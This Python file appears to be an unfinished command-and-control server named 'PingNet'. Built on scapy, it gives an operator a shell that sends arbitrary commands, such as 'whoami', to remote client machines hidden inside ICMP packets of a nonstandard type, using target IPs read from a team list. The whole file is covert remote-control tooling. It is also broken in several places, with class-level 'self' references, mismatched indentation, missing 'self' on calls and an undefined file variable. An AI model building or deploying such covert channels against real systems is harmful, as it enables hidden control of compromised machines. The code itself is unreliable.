from scapy.all import *
import csv
import sys
import threading
import random

class Server:
    self.verbose = False
    self.iplook = lambda id : teams[int(id[0])-1][int(id[1])-1][1]
    def __init__(self):
         # int(input("How many teams are competing?"))
        for i in range(2):
            teams.append([])
        # teamips = input("What is the CSV file containing team info")
        with open("test.txt") as file:
            csv_reader = csv.reader(file, delimiter=',')
            for row in csv_reader:
                if len(row) == 0:
                    break
                else:
                    teams[int(row[0]) - 1].append([row[1], row[2]])
        print(teams)
        # What I want todo is have it so that when deployment is run, instead of doing this it makes callbacks and then registers the id based on my design

  def shell(self):
    global verbose
    print("Welcome to PingNet")
    while True:
        cmd = input("Pingnet:")
        if cmd == "exit":
            print("Closing")
            break
        elif cmd == "help":
            print("\nPingnet Help\ncallbacks(NI) - view all systems that have beat back\nexit - exits ping net\nhelp - Displays this help menu\nlookup <team number(NI) or specific device> - Lookup infomration on a specific device\nlist(NI) - list all of the stored systems\nsend - Enters the send prompts to send either files(not implemented) or commands to the client device\n")
        elif cmd == "lookup":
            lookup = input("What information to pull:")
            try:
                print(iplook(lookup))
            except IndexError:
                print("Out of bounds")
            except ValueError:
                print("Why a negative number")
        elif cmd == "send":
            self.send_cmd()
        elif cmd == "file":
            id = input("Target: ")
            file_transfer(input("What File would you like to send:"), iplook(id))
        elif cmd == "test":
            print("THis is only for testing fuctionality of class not actual control")
            self.sender("11", "whoami", "44", "3")
        else:
            print("Invalid command")

    def sender(self, dest, cmd, protype, protcode):
        rpckt = sr1(IP(dst=self.iplook(dest))/ICMP(type=protype, code=protcode)/cmd)

    def send_cmd(self):
        #typ = random.randint(44,94)
        typ = 44
        target = input("Target:")
        code = input("Cmd Processor")
        cmd =  input("Command:")
        self.sender(target, cmd, typ, code)

    def heartbeat(self):
        print("THis is beat")
    
    def file_transfer(self, fname):
        with open(fname, "rb") as fsend:
            data = f.read()
            print(data)
    
    def encryptor(self):
        pass #This is necessary

